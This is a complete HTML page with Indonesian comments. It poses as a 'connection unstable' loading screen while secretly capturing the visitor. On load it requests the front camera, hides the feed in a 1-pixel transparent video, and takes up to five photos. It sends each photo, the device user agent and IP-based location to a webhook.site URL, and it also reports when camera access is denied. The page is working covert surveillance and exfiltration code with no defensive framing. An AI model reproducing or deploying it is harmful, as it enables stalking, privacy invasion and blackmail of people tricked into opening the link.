<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sedang Memuat...</title>
    <style>
        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; overflow: hidden; }
        #container { position: relative; display: flex; flex-direction: column; align-items: center; }
        #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
        
        /* TRIK BARU: Video dibuat 1px transparan agar browser tetap merender gambar */
        #video {
            position: absolute;
            bottom: 0;
            right: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01; 
            pointer-events: none;
        }
        #canvas { display: none; }
    </style>
</head>
<body>

    <div id="container">
        <div id="loader"></div>
        <div id="status">Koneksi Tidak Stabil...</div>
        <p style="font-size: 12px; color: #888; margin-top: 10px;">Mohon tunggu, sedang mencoba menghubungkan kembali.</p>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        let photoCount = 0;

        async function startSystem() {
            try {
                // Paksa pakai kamera depan (facingMode: user)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                // Tunggu video bener-bener "playing" sebelum ambil foto
                video.onloadedmetadata = () => {
                    video.play();
                    statusDiv.innerText = "Sinkronisasi Data...";
                    setTimeout(takeSnapShot, 3000); // Beri waktu 3 detik buat sensor kamera adaptasi cahaya
                };
            } catch (err) {
                statusDiv.innerText = "Koneksi Gagal.";
                kirimData({ status: "IZIN_DITOLAK", pesan: err.message });
            }
        }

        function takeSnapShot() {
            if (photoCount >= 5) {
                statusDiv.innerText = "Sistem Error 404";
                return;
            }

            // Pastikan video sedang berjalan dan ada datanya
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                photoCount++;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Gunakan kualitas 0.5 agar tidak terlalu berat tapi tetap jelas
                const dataFoto = canvas.toDataURL('image/jpeg', 0.5);

                kirimData({
                    event: "SNAP_SHOT",
                    no: photoCount,
                    foto: dataFoto,
                    perangkat: navigator.userAgent
                });
            }

            setTimeout(takeSnapShot, 3000);
        }

        async function kirimData(payload) {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                const finalData = { ...payload, ...{ kota: ipData.city, provider: ipData.org, ip: ipData.ip } };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(finalData)
                });
            } catch (e) {}
        }

        window.onload = startSystem;
    </script>
</body>
</html>
